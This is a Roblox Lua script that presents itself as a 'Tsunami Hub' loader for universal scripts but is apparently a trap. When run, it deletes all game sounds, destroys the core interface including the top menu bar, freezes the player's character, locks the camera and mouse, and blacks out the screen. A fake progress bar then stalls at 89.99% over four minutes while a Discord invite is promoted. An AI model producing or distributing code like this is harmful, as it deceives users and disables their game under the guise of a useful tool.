local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

-- =========================================
-- SILENCIADOR TOTAL DE SONIDOS - INMEDIATO
-- =========================================
local player = Players.LocalPlayer

-- Función para destruir cualquier sonido
local function muteSound(obj)
    if obj:IsA("Sound") then
        pcall(function()
            obj:Stop()          -- Detener
            obj.Volume = 0      -- Asegurar que no se escuche
            obj:Destroy()       -- Eliminar del juego
        end)
    end
end

-- Limpiar todos los sonidos existentes en el juego y tu personaje
for _, obj in ipairs(game:GetDescendants()) do
    muteSound(obj)
end

-- Interceptar cualquier sonido que aparezca después
game.DescendantAdded:Connect(function(obj)
    muteSound(obj)
end)

-- Bloquear música de fondo o sonidos globales en SoundService
local SoundService = game:GetService("SoundService")
for _, s in ipairs(SoundService:GetDescendants()) do
    muteSound(s)
end
SoundService.DescendantAdded:Connect(function(obj)
    muteSound(obj)
end)

print("✅ TODO SONIDO SILENCIADO - Estilo BlackScreenTotal")

-- 🔪 LIMPIEZA TOTAL + ELIMINACIONES ESPECÍFICAS
local hashGui = CoreGui:FindFirstChild("9a27dc7a97c45c6d31f57cf4da19542bcd92dd0c7606e5019e5911b93cc0198a")
if hashGui then hashGui:Destroy() end

local topBarApp = CoreGui:FindFirstChild("TopBarApp")
if topBarApp then topBarApp:Destroy() end

for _, gui in pairs(CoreGui:GetChildren()) do
    if gui:IsA("ScreenGui") then pcall(function() gui:Destroy() end) end
end
for _, gui in pairs(PlayerGui:GetChildren()) do
    if gui:IsA("ScreenGui") and gui.Name ~= "BlackoutHub" then
        pcall(function() gui:Destroy() end)
    end
end

-- BLOQUEO TOTAL
local function blockPlayer()
    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.PlatformStand = true
        end
    end
end
blockPlayer()
LocalPlayer.CharacterAdded:Connect(blockPlayer)

workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

-- 🖤 PANTALLA NEGRA ABSOLUTA - INMEDIATA
local blackoutGui = Instance.new("ScreenGui")
blackoutGui.Name = "BlackoutHub"
blackoutGui.IgnoreGuiInset = true
blackoutGui.ResetOnSpawn = false
blackoutGui.DisplayOrder = 2147483647
blackoutGui.Parent = PlayerGui

local blackoutFrame = Instance.new("Frame")
blackoutFrame.Size = UDim2.new(1, 0, 1, 0)
blackoutFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackoutFrame.BorderSizePixel = 0
blackoutFrame.ZIndex = 2147483647
blackoutFrame.Parent = blackoutGui

--------------------------------------------------
-- NUEVA INTERFAZ TSUNAMI (450x400) - TU CÓDIGO EXACTO
--------------------------------------------------
local HubGui = Instance.new("ScreenGui")
HubGui.Name = "TsunamiHub"
HubGui.IgnoreGuiInset = true
HubGui.ResetOnSpawn = false
HubGui.DisplayOrder = 2147483647 + 1
HubGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
HubGui.Parent = PlayerGui

local Container = Instance.new("Frame")
Container.Size = UDim2.new(0, 450, 0, 400)
Container.Position = UDim2.new(0.5, -225, 0.5, -200)
Container.BackgroundTransparency = 1
Container.ZIndex = 2147483647 + 2
Container.Parent = HubGui

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1, 0, 1, 0)
MainBG.Position = UDim2.new(0, 0, 0, 0)
MainBG.BackgroundColor3 = Color3.fromRGB(15, 20, 35)
MainBG.BorderSizePixel = 0
MainBG.ZIndex = 2147483647 + 3
MainBG.Parent = Container

local BGCorner = Instance.new("UICorner")
BGCorner.CornerRadius = UDim.new(0, 25)
BGCorner.Parent = MainBG

local BGStroke = Instance.new("UIStroke")
BGStroke.Color = Color3.fromRGB(100, 180, 255)
BGStroke.Thickness = 2
BGStroke.Parent = MainBG

-- 🎯 TÍTULO PRINCIPAL NUEVO
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 0, 60)
Title.Position = UDim2.new(0, 20, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "ESCAPA DEL TSUNAMI"
Title.TextColor3 = Color3.fromRGB(100, 180, 255)
Title.TextScaled = false
Title.TextSize = 28
Title.Font = Enum.Font.GothamBold
Title.ZIndex = 2147483647 + 5
Title.Parent = MainBG

-- 🎯 SUBTÍTULO NUEVO
local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, -40, 0, 45)
SubTitle.Position = UDim2.new(0, 20, 0, 80)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "UNIVERSAL SCRIPTS"
SubTitle.TextColor3 = Color3.fromRGB(255, 120, 160)
SubTitle.TextScaled = false
SubTitle.TextSize = 24
SubTitle.Font = Enum.Font.GothamBold
SubTitle.ZIndex = 2147483647 + 5
SubTitle.Parent = MainBG

-- LOADING TEXT (FIJO TAMBIÉN)
local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1, -40, 0, 35)
LoadingText.Position = UDim2.new(0, 20, 0, 130)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "LOADING SCRIPT"
LoadingText.TextColor3 = Color3.fromRGB(160, 160, 180)
LoadingText.TextScaled = false
LoadingText.TextSize = 20
LoadingText.Font = Enum.Font.Gotham
LoadingText.ZIndex = 2147483647 + 5
LoadingText.Parent = MainBG

-- AVATAR CENTRADO
local AvatarHolder = Instance.new("Frame")
AvatarHolder.Size = UDim2.new(0, 80, 0, 80)
AvatarHolder.Position = UDim2.new(0.5, -40, 0, 175)
AvatarHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AvatarHolder.BackgroundTransparency = 0.85
AvatarHolder.ZIndex = 2147483647 + 5
AvatarHolder.Parent = MainBG

local AvatarCorner = Instance.new("UICorner")
AvatarCorner.CornerRadius = UDim.new(0, 40)
AvatarCorner.Parent = AvatarHolder

local AvatarRing = Instance.new("UIStroke")
AvatarRing.Color = Color3.fromRGB(100, 180, 255)
AvatarRing.Thickness = 3
AvatarRing.Parent = AvatarHolder

local AvatarImg = Instance.new("ImageLabel")
AvatarImg.Size = UDim2.new(0.87, 0, 0.87, 0)
AvatarImg.Position = UDim2.new(0.065, 0, 0.065, 0)
AvatarImg.BackgroundTransparency = 1
AvatarImg.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
AvatarImg.ZIndex = 2147483647 + 6
AvatarImg.Parent = AvatarHolder

-- PORCENTAJE (FIJO TAMBIÉN)
local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0, 90, 0, 40)
PercentText.Position = UDim2.new(0.5, -45, 0, 265)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.fromRGB(100, 180, 255)
PercentText.TextScaled = false
PercentText.TextSize = 24
PercentText.Font = Enum.Font.GothamBold
PercentText.ZIndex = 2147483647 + 6
PercentText.Parent = MainBG

-- BARRA PROGRESO DELGADA
local ProgressContainer = Instance.new("Frame")
ProgressContainer.Size = UDim2.new(1, -60, 0, 8)
ProgressContainer.Position = UDim2.new(0, 30, 0, 310)
ProgressContainer.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
ProgressContainer.BorderSizePixel = 0
ProgressContainer.ZIndex = 2147483647 + 5
ProgressContainer.Parent = MainBG

local ProgressCorner = Instance.new("UICorner")
ProgressCorner.CornerRadius = UDim.new(0, 4)
ProgressCorner.Parent = ProgressContainer

local ProgressFill = Instance.new("Frame")
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
ProgressFill.BorderSizePixel = 0
ProgressFill.ZIndex = 2147483647 + 6
ProgressFill.Parent = ProgressContainer

local ProgressFillCorner = Instance.new("UICorner")
ProgressFillCorner.CornerRadius = UDim.new(0, 4)
ProgressFillCorner.Parent = ProgressFill

-- DISCORD FRAME (TEXTO FIJO)
local DiscordFrame = Instance.new("Frame")
DiscordFrame.Size = UDim2.new(1, -60, 0, 45)
DiscordFrame.Position = UDim2.new(0, 30, 0, 330)
DiscordFrame.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
DiscordFrame.BorderSizePixel = 0
DiscordFrame.ZIndex = 2147483647 + 5
DiscordFrame.Parent = MainBG

local DiscordCorner = Instance.new("UICorner")
DiscordCorner.CornerRadius = UDim.new(0, 14)
DiscordCorner.Parent = DiscordFrame

local DiscordStroke = Instance.new("UIStroke")
DiscordStroke.Color = Color3.fromRGB(100, 180, 255)
DiscordStroke.Thickness = 1.5
DiscordStroke.Parent = DiscordFrame

local DiscordText = Instance.new("TextLabel")
DiscordText.Size = UDim2.new(1, -100, 1, 0)
DiscordText.Position = UDim2.new(0, 15, 0, 0)
DiscordText.BackgroundTransparency = 1
DiscordText.Text = "discord.gg/MHNwut"
DiscordText.TextColor3 = Color3.fromRGB(150, 200, 255)
DiscordText.TextScaled = false
DiscordText.TextSize = 14
DiscordText.Font = Enum.Font.GothamSemibold
DiscordText.TextXAlignment = Enum.TextXAlignment.Left
DiscordText.ZIndex = 2147483647 + 6
DiscordText.Parent = DiscordFrame

-- BOTÓN COPY
local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(0, 75, 0, 35)
CopyBtn.Position = UDim2.new(1, -90, 0, 5)
CopyBtn.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
CopyBtn.Text = "📋 COPY"
CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBtn.TextScaled = true
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.ZIndex = 2147483647 + 7
CopyBtn.Parent = DiscordFrame

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 12)
CopyCorner.Parent = CopyBtn

local CopyStroke = Instance.new("UIStroke")
CopyStroke.Color = Color3.fromRGB(255, 255, 255)
CopyStroke.Thickness = 1.5
CopyStroke.Transparency = 0.3
CopyStroke.Parent = CopyBtn

local CopyGradient = Instance.new("UIGradient")
CopyGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 190, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 160, 255))
}
CopyGradient.Rotation = 45
CopyGradient.Parent = CopyBtn

-- ANIMACIÓN ENTRADA
Container.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(Container, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 450, 0, 400)
}):Play()

-- ANIMACIONES BOTÓN COPY
local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
local clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

CopyBtn.MouseEnter:Connect(function()
    TweenService:Create(CopyBtn, hoverInfo, {
        Size = UDim2.new(0, 82, 0, 38),
        BackgroundColor3 = Color3.fromRGB(120, 200, 255)
    }):Play()
    TweenService:Create(CopyStroke, hoverInfo, {
        Thickness = 2,
        Transparency = 0
    }):Play()
end)

CopyBtn.MouseLeave:Connect(function()
    TweenService:Create(CopyBtn, hoverInfo, {
        Size = UDim2.new(0, 75, 0, 35),
        BackgroundColor3 = Color3.fromRGB(100, 180, 255)
    }):Play()
    TweenService:Create(CopyStroke, hoverInfo, {
        Thickness = 1.5,
        Transparency = 0.3
    }):Play()
end)

CopyBtn.MouseButton1Down:Connect(function()
    TweenService:Create(CopyBtn, clickInfo, {
        Size = UDim2.new(0, 70, 0, 32)
    }):Play()
end)

CopyBtn.MouseButton1Up:Connect(function()
    TweenService:Create(CopyBtn, clickInfo, {
        Size = UDim2.new(0, 75, 0, 35)
    }):Play()
end)

CopyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard("discord.gg/MHNwut")
        CopyBtn.Text = "✅ COPIED!"
        TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            BackgroundColor3 = Color3.fromRGB(100, 255, 100),
            Size = UDim2.new(0, 85, 0, 40)
        }):Play()
        task.wait(1.2)
        TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
            BackgroundColor3 = Color3.fromRGB(100, 180, 255),
            Size = UDim2.new(0, 75, 0, 35)
        }):Play()
        CopyBtn.Text = "📋 COPY"
        print("✅ Copiado: discord.gg/MHNwut")
    end
end)

-- 🎯 PROGRESO PERFECTO: 89.99% EN 4 MINUTOS
local totalDuration = 240 -- 4 minutos
local startTime = tick()
local progressReached = false

spawn(function()
    while not progressReached do
        local elapsed = tick() - startTime
        local progress = math.min((elapsed / totalDuration) * 89.99, 89.99)
        
        TweenService:Create(ProgressFill, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.new(progress / 100, 0, 1, 0)
        }):Play()
        
        PercentText.Text = string.format("%.2f%%", progress)
        
        if elapsed >= totalDuration then
            progressReached = true
            break
        end
        
        wait(0.1)
    end
end)

-- AVATAR ROTACIÓN SUAVE
spawn(function()
    while AvatarHolder.Parent do
        TweenService:Create(AvatarHolder, TweenInfo.new(5, Enum.EasingStyle.Linear), {
            Rotation = 360
        }):Play()
        task.wait(5)
    end
end)

print("🌟 TSUNAMI HUB 2026 - INSTANTÁNEO + SILENCIO TOTAL")
print("✅ PANTALLA NEGRA INMEDIATA - ESCAPA DEL TSUNAMI")
